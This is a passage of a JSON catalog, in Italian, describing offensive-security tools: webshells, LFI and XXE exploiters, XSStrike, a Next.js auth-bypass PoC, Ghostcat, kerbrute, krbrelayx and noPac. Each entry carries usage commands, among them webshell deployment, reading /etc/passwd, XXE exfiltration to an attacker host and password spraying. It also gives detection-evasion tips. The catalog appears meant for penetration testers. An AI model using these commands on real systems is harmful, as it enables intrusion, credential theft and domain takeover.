    "repo": "https://github.com/SecurityRiskAdvisors/cmd.jsp",
    "desc": "Webshell JSP minimalista per Apache Tomcat che fornisce esecuzione comandi via parametro HTTP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Tomcat_cmd.jsp</strong> è una webshell minimalista scritta in Java Server Pages (JSP), progettata specificamente per server Apache Tomcat. La sua semplicità è intenzionale: poche righe di codice che implementano esclusivamente l'esecuzione di comandi di sistema, riducendo la superficie di detection e massimizzando la compatibilità. Viene tipicamente deployata tramite il Tomcat Manager Application quando si ottengono credenziali valide, o tramite vulnerabilità di arbitrary file upload in applicazioni Java.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Minimal Command Execution:</strong> Implementa un singolo endpoint che accetta comandi via parametro GET/POST e li esegue tramite <code>Runtime.getRuntime().exec()</code>. La semplicità del codice riduce le possibilità di errori e aumenta la compatibilità con diverse versioni di Tomcat.</p><p><strong>Cross-Platform Detection:</strong> Rileva automaticamente il sistema operativo e utilizza la shell appropriata: <code>cmd.exe /c</code> su Windows o <code>/bin/sh -c</code> su Linux/Unix. Questo garantisce funzionamento immediato senza modifiche manuali.</p><p><strong>Output Streaming:</strong> Cattura e restituisce sia stdout che stderr del comando eseguito, permettendo di vedere errori e output completo direttamente nel browser. Gestisce correttamente encoding e caratteri speciali.</p><p><strong>Stateless Operation:</strong> Non mantiene stato tra le richieste, non crea file temporanei, non richiede sessioni. Ogni richiesta è indipendente, semplificando l'utilizzo e riducendo le tracce.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Il deployment tipico avviene tramite Tomcat Manager o upload diretto nella directory webapps.</p><pre><code># Deploy tramite Tomcat Manager (dopo aver ottenuto credenziali)\ncurl -u tomcat:password --upload-file cmd.jsp http://target:8080/manager/text/deploy?path=/cmd\n\n# Esecuzione comandi via GET\nhttp://target:8080/cmd/cmd.jsp?cmd=id\nhttp://target:8080/cmd/cmd.jsp?cmd=whoami\nhttp://target:8080/cmd/cmd.jsp?cmd=cat /etc/passwd\n\n# Comandi con spazi (URL encoded)\nhttp://target:8080/cmd/cmd.jsp?cmd=ls%20-la%20/tmp\n\n# Via curl per automazione\ncurl \"http://target:8080/cmd/cmd.jsp?cmd=uname%20-a\"</code></pre><p>Per comandi complessi o con caratteri speciali, utilizzare POST invece di GET per evitare problemi di URL encoding e limitazioni di lunghezza.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Tomcat Exploitation</strong>, dopo aver ottenuto credenziali del Manager (spesso default come tomcat:tomcat, admin:admin, o tramite bruteforce), cmd.jsp è il payload standard per convertire l'accesso amministrativo in Remote Code Execution.</p><p>In scenari di <strong>Java Application Testing</strong>, quando si scopre una vulnerabilità di file upload in un'applicazione Java, deployare una JSP webshell è il metodo più diretto per ottenere RCE.</p><p>Per <strong>Pivoting</strong>, una volta stabilita la webshell, può essere usata per scaricare ed eseguire tool aggiuntivi, stabilire reverse shell più stabili, o enumerare la rete interna.</p><p>Durante <strong>CTF e Lab</strong>, è un payload classico per challenge che coinvolgono Tomcat misconfiguration.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I file .jsp nelle directory web sono monitorati da molte soluzioni di sicurezza. L'esecuzione di comandi shell da processi Java (java.exe/java spawna cmd.exe o sh) è un indicatore comportamentale forte rilevato da EDR. I comandi eseguiti appaiono nei log di sistema.</p><p><strong>Impatto:</strong> La webshell eredita i privilegi del processo Tomcat, tipicamente un utente di servizio con accesso limitato ma sufficiente per enumerazione e lateral movement.</p><p><strong>Mitigazioni:</strong> Utilizzare nomi file non predicibili invece di cmd.jsp. Rimuovere la shell immediatamente dopo l'uso. Considerare webshell offuscate o tecniche di memory-only execution per ambienti con monitoraggio attivo. Il traffico HTTP contenente comandi è visibile in chiaro nei log e nel traffico di rete.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "File_Upload"
    ],
    "notes": null
  },
  {
    "id": "wwwolf-php-webshell",
    "name": "wwwolf-php-webshell",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/WhiteWinterWolf/wwwolf-php-webshell",
    "desc": "Webshell PHP 'WhiteWinterWolf' ottimizzata per stabilità, file upload e bypass restrizioni (open_basedir).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>La webshell di WhiteWinterWolf (wwwolf) rappresenta l'evoluzione del concetto di webshell PHP verso la massima affidabilità e portabilità. Progettata con un focus sulla resilienza, questa shell funziona correttamente su configurazioni PHP estremamente restrittive dove altre webshell falliscono. Gestisce automaticamente le differenze tra ambienti Windows e Linux, tenta bypass intelligenti di restrizioni come <code>open_basedir</code> e <code>disable_functions</code>, e offre un'interfaccia web pulita che non richiede JavaScript per le operazioni di base.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Cross-Platform Intelligence:</strong> Rileva automaticamente il sistema operativo e adatta i comandi di conseguenza. Su Windows utilizza <code>cmd.exe</code>, su Linux <code>/bin/sh</code>, gestendo correttamente separatori di path e variabili d'ambiente specifiche della piattaforma.</p><p><strong>Restriction Bypass:</strong> Implementa tecniche per aggirare configurazioni PHP restrittive. Tenta di resettare <code>open_basedir</code> tramite ini_set, utilizza funzioni alternative per l'esecuzione comandi (system, passthru, exec, shell_exec, popen, proc_open) testando quale sia disponibile, e gestisce correttamente ambienti con safe_mode legacy.</p><p><strong>File Manager Integrato:</strong> Include funzionalità complete di gestione file: upload via form multipart, download di file dal server, navigazione directory, visualizzazione permessi e dimensioni. Tutto accessibile tramite interfaccia HTML pura senza dipendenze JavaScript.</p><p><strong>Output Handling Robusto:</strong> Cattura correttamente sia stdout che stderr dei comandi eseguiti, mostrando errori che altre shell nascondono. Supporta output binario per download di file non testuali.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>La webshell è un singolo file PHP da caricare sul server target tramite vulnerabilità di file upload, LFI-to-RCE, o accesso FTP/SSH compromesso.</p><pre><code># Upload della shell sul target (es. via curl dopo aver ottenuto accesso)\ncurl -F 'file=@webshell.php' http://target.com/upload.php\n\n# Accesso via browser\nhttp://target.com/uploads/webshell.php\n\n# Esecuzione comandi dall'interfaccia web\n# Inserire comando nel campo input e premere Execute\n\n# Download file dal server\n# Navigare al file desiderato e cliccare Download</code></pre><p>La shell è configurabile: è possibile impostare una password di accesso modificando la variabile all'inizio del file per evitare accessi non autorizzati da parte di altri attaccanti.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Web Application Penetration Testing</strong>, dopo aver sfruttato una vulnerabilità di upload, wwwolf fornisce un punto d'appoggio stabile per l'enumerazione del sistema, la lettura di file di configurazione e la preparazione di privilege escalation.</p><p>In scenari di <strong>Post-Exploitation</strong>, permette di trasferire tool aggiuntivi (come LinPEAS o exploit kernel) sul target senza necessità di reverse shell, utile quando le connessioni outbound sono bloccate.</p><p>Per operazioni di <strong>Red Team</strong>, la sua leggerezza e assenza di dipendenze la rendono ideale come fallback quando shell più sofisticate vengono bloccate da WAF o AV.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Come tutte le webshell, lascia un file PHP sul disco con signature riconoscibili. Scanner come ClamAV, YARA rules specifiche e soluzioni WAF (ModSecurity) possono identificarla. I log del web server registrano ogni accesso.</p><p><strong>Impatto:</strong> Una webshell esposta può essere scoperta e utilizzata da altri attaccanti. Proteggere sempre con password e utilizzare nomi file non predicibili.</p><p><strong>Mitigazioni:</strong> Eliminare la shell immediatamente dopo l'uso. Utilizzare nomi file randomizzati invece di shell.php. Considerare webshell memory-only o tecniche di offuscamento per ambienti con monitoraggio attivo. Verificare i log di accesso per attività sospette post-operazione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "File_Upload"
    ],
    "notes": null
  },
  {
    "id": "lfifreak",
    "name": "LFiFreak",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/OsandaMalith/LFiFreak",
    "desc": "Tool per sfruttamento automatico di vulnerabilità Local File Inclusion (LFI) con supporto per shell reverse e RCE via wrapper PHP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>LFiFreak</strong> automatizza il processo spesso noioso di sfruttamento delle vulnerabilità di Local File Inclusion. Invece di testare manualmente decine di payload, il tool scansiona i parametri URL vulnerabili e tenta di trasformare una semplice lettura di file in una Remote Code Execution (RCE) completa, sfruttando wrapper PHP, log poisoning o file upload.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Wrapper Abuse:</strong> Testa automaticamente wrapper come <code>php://filter</code> per leggere sorgenti PHP codificati in base64 (evitando l'esecuzione server-side) o <code>php://input</code> e <code>data://</code> per iniettare codice arbitrario se le configurazioni lo permettono.</p><p><strong>RCE Techniques:</strong> Include tecniche avanzate per ottenere una shell: iniezione nei log di Apache/SSH (Log Poisoning) per poi includerli, o accesso ai file di sessione PHP e al file system virtuale <code>/proc/self/environ</code>.</p><p><strong>Interactive Shell:</strong> Se l'exploit ha successo, fornisce un'interfaccia pseudo-shell per inviare comandi al server vittima come se si fosse in un terminale locale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede Python 2.7 (legacy). Si avvia specificando l'URL con il parametro vulnerabile.</p><pre><code># Scansione e attacco su parametro 'page'\npython lfifreak.py --url \"http://target.com/index.php?page=FUZZ\"\n\n# Tentativo specifico di RCE via access.log\npython lfifreak.py --url \"http://target.com/vuln.php?file=\" --method logs</code></pre><p>Il tool chiederà interattivamente quali payload testare e mostrerà l'output dei comandi eseguiti.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante un <strong>Web Pentest</strong>, quando si individua una potenziale LFI ma i file comuni (<code>/etc/passwd</code>) non portano a nulla di interessante. LFiFreak permette di scalare rapidamente la vulnerabilità per ottenere accesso al sistema operativo sottostante.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I payload di path traversal (<code>../../etc/passwd</code>) sono signature classiche per qualsiasi WAF/IDS. Il log poisoning lascia tracce permanenti e visibili nei log di sistema del server.</p><p><strong>Impatto operativo:</strong> L'iniezione di codice nei log o nelle sessioni può corrompere file critici, potenzialmente causando DoS del servizio web.</p><p><strong>Mitigazioni:</strong> Usare encoding (URL, Double URL) per offuscare i payload. Verificare manualmente l'esistenza della vuln con payload innocui prima di lanciare l'automazione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "LFI"
    ],
    "notes": null
  },
  {
    "id": "lfisuite",
    "name": "LFISuite",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/D35m0nd142/LFISuite",
    "desc": "Scanner e exploiter automatico per vulnerabilità Local File Inclusion (LFI) con 50+ metodi di bypass WAF e shell upload.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>LFISuite</strong> automatizza la ricerca e lo sfruttamento di vulnerabilità LFI. Invece di testare manualmente payload come <code>../../etc/passwd</code>, questo tool itera attraverso decine di tecniche di evasione (null byte, encoding, wrapper PHP) per aggirare filtri e WAF. Se possibile, tenta di convertire la LFI in RCE tramite tecniche come <code>/proc/self/environ</code> injection o log poisoning.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>WAF Bypass:</strong> Utilizza diverse strategie (path truncation, URL encoding, double encoding) per nascondere il traversamento delle directory.</p><p><strong>Reverse Shell:</strong> Include una modalità automatica per ottenere una shell inversa se rileva che può includere file remoti (RFI) o iniettare codice.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Script Python 2 interattivo.</p><pre><code># Avvio interfaccia\npython2 lfisuite.py\n# Selezionare \"Scanner\" o \"Exploiter\" e inserire URL/Cookie</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Web App Pentest:</strong> Quando si sospetta una LFI ma i payload standard falliscono. LFISuite prova esaustivamente le varianti per trovare quella che funziona.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Estremamente rumoroso. Invia centinaia di richieste malevole in pochi secondi. Sicuro trigger per qualsiasi IDS.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "LFI"
    ],
    "notes": null
  },
  {
    "id": "liffy",
    "name": "liffy",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/mzfr/liffy",
    "desc": "Tool moderno per LFI exploitation che sfrutta wrapper PHP (data://, input://, filter://) per data extraction e RCE.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Liffy</strong> è uno strumento specializzato nello sfruttamento avanzato delle vulnerabilità Local File Inclusion (LFI) in applicazioni PHP. La sua forza sta nell'automazione dei PHP wrapper attacks: utilizza <code>php://filter</code> per estrarre codice sorgente in base64 (evitando l'esecuzione), <code>data://</code> e <code>input://</code> per ottenere Remote Code Execution (RCE), e tecniche avanzate di filter chaining per bypassare filtri di input. È più mirato e sofisticato di tool generici come LFISuite.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>PHP Filter Wrapper Exploitation:</strong> Automatizza l'uso di <code>php://filter/convert.base64-encode/resource=</code> per leggere file PHP senza eseguirli. Il contenuto viene restituito codificato in base64, rivelando credenziali hardcoded, logica di business, e altre vulnerabilità nel codice sorgente.</p><p><strong>Filter Chain Bypass:</strong> Genera catene di filtri PHP complesse per bypassare WAF e filtri di input che bloccano caratteri specifici. Usa tecniche come rot13, string.strip_tags, e convert.iconv per costruire payload che evadono i controlli.</p><p><strong>Data Wrapper RCE:</strong> Quando <code>allow_url_include</code> è abilitato, sfrutta <code>data://text/plain;base64,</code> per iniettare ed eseguire codice PHP arbitrario, trasformando una LFI in RCE completa.</p><p><strong>Interactive Pseudo-Shell:</strong> Dopo aver stabilito l'esecuzione di codice, fornisce una shell interattiva per eseguire comandi sul server target senza dover crafting manuale di ogni payload.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Liffy è uno script Python 3 con interfaccia CLI. Il parametro FUZZ indica dove inserire il payload.</p><pre><code># Leggi codice sorgente di un file PHP\npython3 liffy.py -u \"http://target.com/index.php?page=FUZZ\" --data /var/www/html/config.php\n\n# Tentativo RCE con shell interattiva\npython3 liffy.py -u \"http://target.com/vuln.php?file=FUZZ\" --shell\n\n# Specifica wrapper da usare\npython3 liffy.py -u \"http://target.com/?inc=FUZZ\" --data /etc/passwd --wrapper filter\n\n# Dump multipli file\npython3 liffy.py -u \"http://target.com/?page=FUZZ\" --data /var/www/html/index.php,/var/www/html/db.php\n\n# Con cookie di sessione\npython3 liffy.py -u \"http://target.com/?page=FUZZ\" --data /etc/passwd --cookie \"PHPSESSID=abc123\"</code></pre><p>L'output base64 dei file estratti viene automaticamente decodificato e mostrato.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>CTF</strong>, le LFI sono vulnerabilità comuni. Liffy permette di estrarre rapidamente file chiave come config.php, flag.txt, o credenziali database senza trial-and-error manuale.</p><p>Nel <strong>Web Application Penetration Testing</strong>, dopo aver identificato una LFI, Liffy automatizza l'escalation verso la lettura di file sensibili e potenzialmente RCE.</p><p>Per <strong>Code Audit</strong>, estrarre il codice sorgente di un'applicazione PHP vulnerabile permette di identificare altre vulnerabilità (SQLi, auth bypass) nel codice stesso.</p><p>In scenari di <strong>Bug Bounty</strong>, dimostrare l'impatto di una LFI leggendo /etc/passwd o file di configurazione aumenta la severity del report.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I payload contenenti php://filter e data:// sono signature note per WAF. Le richieste con path traversal (../) e wrapper PHP nei parametri generano alert su sistemi di sicurezza moderni.</p><p><strong>Prerequisiti:</strong> Le tecniche RCE richiedono <code>allow_url_include=On</code> in php.ini, configurazione rara su sistemi moderni. La lettura file con filter wrapper funziona in più scenari.</p><p><strong>Impatto:</strong> L'estrazione di codice sorgente può rivelare informazioni sensibili. L'RCE fornisce controllo completo del server web.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "LFI"
    ],
    "notes": null
  },
  {
    "id": "xsstrike-3-1-6",
    "name": "XSStrike",
    "version": "3.1.6",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/s0md3v/XSStrike",
    "desc": "Suite avanzata per rilevamento XSS con analisi del contesto, fuzzing intelligente e generazione payload (non solo regex).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>XSStrike</strong> è un salto evolutivo rispetto agli scanner XSS basati su semplici pattern match. Include un motore di analisi del contesto che esamina come l'input viene riflesso nella pagina (dentro un tag, in un attributo, in uno script JS) e genera payload specifici per rompere quel contesto. Include anche un crawler, un fuzzer di parametri e capacità di bypass WAF.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Context Analysis:</strong> Capisce se l'input finisce in <code><input value=\"...\"></code> o <code>var x = '...'</code> e costruisce l'escape corretto.</p><p><strong>Intelligent Fuzzing:</strong> Invece di provare migliaia di payload a caso, ne prova pochi ma mirati e analizza la risposta per vedere se i caratteri pericolosi vengono sanitizzati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Interfaccia CLI Python.</p><pre><code># Scansione URL singolo\npython3 xsstrike.py -u \"https://target.com/search?q=test\"\n\n# Crawling e scan intero sito\npython3 xsstrike.py -u \"https://target.com\" --crawl</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Bug Bounty & Web Pentest:</strong> Quando scanner generici falliscono, XSStrike trova XSS complessi (es. DOM-based o in contesti JS difficili) riducendo i falsi positivi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Genera traffico malevolo (tag script, eventi on*) che i WAF bloccano. Supporta delay e proxy per mitigare.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "XSS"
    ],
    "notes": null
  },
  {
    "id": "xxeinjector",
    "name": "XXEinjector",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/enjoiz/XXEinjector",
    "desc": "Tool automatico per sfruttare vulnerabilità XXE (XML External Entity): estrazione file (OOB), enumerazione porte e RCE.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>XXEinjector</strong> è un framework Ruby per automatizzare attacchi XXE complessi. Gestisce la creazione di server locali (HTTP/FTP) per ricevere dati esfiltrati via Out-Of-Band (OOB) channels, essenziale quando l'XXE è \"blind\" (non mostra output nella risposta). Supporta protocolli multipli (SOAP, XML-RPC, REST).</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>OOB Exfiltration:</strong> Avvia server per catturare file inviati dal target via DTD injection.</p><p><strong>Port Scanning:</strong> Può usare l'XXE per scansionare la rete interna del server (SSRF via XXE).</p><p><strong>PHP Expect:</strong> Tenta RCE se il wrapper <code>expect://</code> è abilitato.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede di salvare la richiesta HTTP vulnerabile in un file.</p><pre><code># Attacco Blind OOB per leggere /etc/passwd\nruby XXEinjector.rb --host=attacker_ip --path=/etc/passwd --file=req.txt --proxy=127.0.0.1:8080 --oob=http</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Web App Pentest:</strong> Exploitation di endpoint XML (es. SAML, SOAP) vulnerabili. L'OOB è spesso l'unico modo per dimostrare l'impatto critico di una Blind XXE.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il server target effettuerà connessioni in uscita verso l'IP dell'attaccante (OOB). Questo traffico è spesso bloccato o loggato dai firewall egress.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "XXE"
    ],
    "notes": null
  },
  {
    "id": "poc-cve-2025-29927",
    "name": "PoC CVE-2025-29927",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Exploit per bypass autorizzazione middleware in Next.js tramite manipolazione header (x-middleware-subrequest).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questo Proof of Concept dimostra una vulnerabilità critica in Next.js (CVE-2025-29927) che permette di aggirare i controlli di sicurezza implementati nel middleware. Inserendo uno specifico header interno (<code>x-middleware-subrequest</code>) nella richiesta HTTP, un attaccante può ingannare l'applicazione facendole credere che la richiesta provenga da un componente interno fidato, saltando così le verifiche di autenticazione o autorizzazione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Middleware Bypass:</strong> Neutralizza le regole di sicurezza definite nel middleware (es. redirect al login, check permessi) per accedere direttamente a route protette.</p><p><strong>Header Injection:</strong> Costruisce richieste con l'header <code>x-middleware-subrequest</code> valorizzato in modo da matchare il nome del middleware interno, forzando il bypass.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Utilizzare curl o lo script Python per inviare la richiesta manipolata.</p><pre><code># Accesso a /admin bypassando auth\ncurl -H \"x-middleware-subrequest: middleware\" http://target.com/admin</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Modern Web App Assessment:</strong> Cruciale per testare applicazioni React/Next.js recenti. Se il middleware gestisce l'authz, questo exploit garantisce accesso amministrativo o ai dati utente senza credenziali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> La presenza dell'header <code>x-middleware-subrequest</code> in richieste esterne è un indicatore di attacco certo. Facile da filtrare a livello di reverse proxy.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Next_js"
    ],
    "notes": null
  },
  {
    "id": "cnvd-2020-10487-tomcat-ajp-lfi",
    "name": "CNVD-2020-10487-Tomcat-Ajp-lfi",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi",
    "desc": "Exploit PoC per vulnerabilità \"Ghostcat\" in Apache Tomcat (AJP connector) che permette lettura file e RCE.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questo script sfrutta la vulnerabilità Ghostcat (CVE-2020-1938 / CNVD-2020-10487) presente nel protocollo AJP di Apache Tomcat. Il connettore AJP (porta 8009) è spesso abilitato di default e si fida di tutti i pacchetti in arrivo. L'exploit permette a un attaccante non autenticato di leggere file di configurazione o codice sorgente dalla webapp (Local File Inclusion) o, se è possibile l'upload di file, di ottenere Remote Code Execution.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>LFI via AJP:</strong> Invia pacchetti AJP malformati per forzare il server a processare file arbitrari (come <code>WEB-INF/web.xml</code>) come se fossero pagine JSP, rivelando password o configurazioni sensibili.</p><p><strong>RCE Potential:</strong> Se l'attaccante può caricare un file (anche un'immagine) sul server, questo exploit può forzare Tomcat a includerlo ed eseguirlo come codice malevolo.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede Python e l'IP del target (porta 8009).</p><pre><code># Lettura del file web.xml (default)\npython2 exploit.py 192.168.1.10\n\n# Lettura di un file specifico\npython2 exploit.py 192.168.1.10 -f WEB-INF/classes/application.properties</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Molto comune in <strong>Internal Pentest</strong>, dove la porta 8009 non è filtrata dai firewall interni. Spesso permette di ottenere credenziali database dai file di configurazione estratti, portando alla compromissione totale dell'applicazione.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Traffico sulla porta 8009 è sospetto se non proviene da un reverse proxy noto. IDS rilevano le firme Ghostcat standard.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Tomcat"
    ],
    "notes": null
  },
  {
    "id": "kerbrute-linux-amd64",
    "name": "kerbrute_linux_amd64",
    "version": "1.0.3",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/ropnop/kerbrute",
    "desc": "Tool Go per enumerazione utenti e password spraying veloce tramite Kerberos Pre-Auth, evitando blocchi account.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Kerbrute è lo strumento standard per enumerare validi account Active Directory e testare password in modo furtivo. Sfrutta il fatto che il KDC (Key Distribution Center) risponde diversamente alle richieste di pre-autenticazione per utenti inesistenti rispetto a quelli esistenti, permettendo di validare liste di username enormi molto velocemente senza generare log di \"Logon Failure\" (Event 4625) classici.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>User Enum Stealth:</strong> Valida l'esistenza degli utenti analizzando gli errori Kerberos, invisibile a policy di lockout standard.</p><p><strong>Password Spraying:</strong> Esegue tentativi di accesso distribuiti (una password per tutti gli utenti) verificando le credenziali direttamente contro il DC via porta 88.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Non richiede dominio joinato, solo visibilità di rete.</p><pre><code># Enumerazione utenti validi\n./kerbrute userenum -d lab.local --dc 192.168.1.5 users.txt\n\n# Password Spraying\n./kerbrute passwordspray -d lab.local users.txt \"Summer2024!\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Internal Recon:</strong> Il primo passo in un internal pentest black-box per pulire la lista di potenziali username prima di attaccarli, o per ottenere il primo accesso valido tramite spraying.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Genera Event ID 4771 (Kerberos Pre-Auth Failed). Defender for Identity rileva facilmente volumi alti di queste richieste.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "krbrelayx",
    "name": "krbrelayx",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/dirkjanm/krbrelayx",
    "desc": "Toolkit per attacchi di coercizione e relay Kerberos (LDAP/SMB) per scalare privilegi su Active Directory.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>KrbRelayX</strong> è una suite di strumenti progettata per sfruttare vulnerabilità logiche nel protocollo Kerberos e nelle configurazioni di delega. Permette di intercettare autenticazioni Kerberos forzate (tramite tecniche di coercizione come PrinterBug o PetitPotam) e inoltrarle (Relay) verso altri servizi, tipicamente LDAP, per creare nuovi account macchina o modificare attributi sensibili (RBCD).</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Kerberos Relaying:</strong> A differenza del relay NTLM, il relay Kerberos è possibile in specifici scenari (es. uPnP non patchato o cross-protocol). Permette di ottenere privilegi SYSTEM su computer target o modificare owner di oggetti AD.</p><p><strong>DCSync via Relay:</strong> Se si riesce a rilanciare l'autenticazione di un DC verso LDAP, è possibile eseguire abuse di ACL per preparare un attacco DCSync.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede coordinazione tra listener e trigger di coercizione.</p><pre><code># Avvio listener relay verso LDAP per creare computer account\npython3 krbrelayx.py -t ldaps://dc01.local\n\n# Innesco coercizione (da altro terminale/tool)\npython3 printerbug.py domain/user:pass@target_ip listener_ip</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Privilege Escalation avanzata:</strong> Usato quando NTLM relay è mitigato (SMB Signing). Permette di passare da accesso di rete a Domain Admin sfruttando un server non patchato che accetta connessioni in entrata.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'uso di account macchina anomali o modifiche RBAC sono loggate. Le tecniche di coercizione (RPC pipes) sono monitorate.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "nopac",
    "name": "noPac",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/Ridter/noPac",
    "desc": "Exploit tool per CVE-2021-42278 e CVE-2021-42287 (sAMAccountName spoofing) che permette Privilege Escalation a Domain Admin.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>NoPac</strong> (o sam-the-admin) sfrutta due vulnerabilità nella gestione Kerberos degli account macchina. Rinominando un account macchina (che l'utente può creare/gestire) per matchare il nome di un Domain Controller, richiedendo un TGT, e poi rinominandolo indietro, è possibile ottenere un Service Ticket valido per il DC come se fossimo amministratori. Il risultato è l'accesso come Domain Admin istantaneo.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Privilege Escalation:</strong> Da utente standard (con quota machine account > 0) a Domain Admin in pochi secondi.</p><p><strong>DCSync:</strong> Spesso integra la funzionalità di dump degli hash (DCSync) subito dopo l'exploit.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Script Python (Impacket based).</p><pre><code># Exploit chain per ottenere shell come SYSTEM sul DC\npython3 noPac.py domain.local/user:pass -dc-ip 192.168.1.5 -shell\n\n# Solo dump hash\npython3 noPac.py domain.local/user:pass -dc-ip 192.168.1.5 -dump</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Internal Pentest:</strong> Se il dominio non è patchato (patch fine 2021), questo è il metodo più veloce per compromettere l'intero dominio 